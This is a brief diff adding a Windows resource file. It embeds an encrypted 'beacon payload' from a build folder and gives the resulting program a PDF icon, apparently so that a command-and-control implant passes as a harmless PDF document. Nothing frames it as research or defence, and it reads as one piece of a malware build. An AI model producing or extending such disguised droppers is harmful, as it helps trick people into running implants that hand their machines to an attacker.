@@ -1,0 +1,9 @@
+#include <windows.h>
+
+// Embed encrypted beacon payload
+BEACON_PAYLOAD RCDATA "build\\beacon.enc"
+
+// PDF icon
+1 ICON "pdf.ico"
+
+
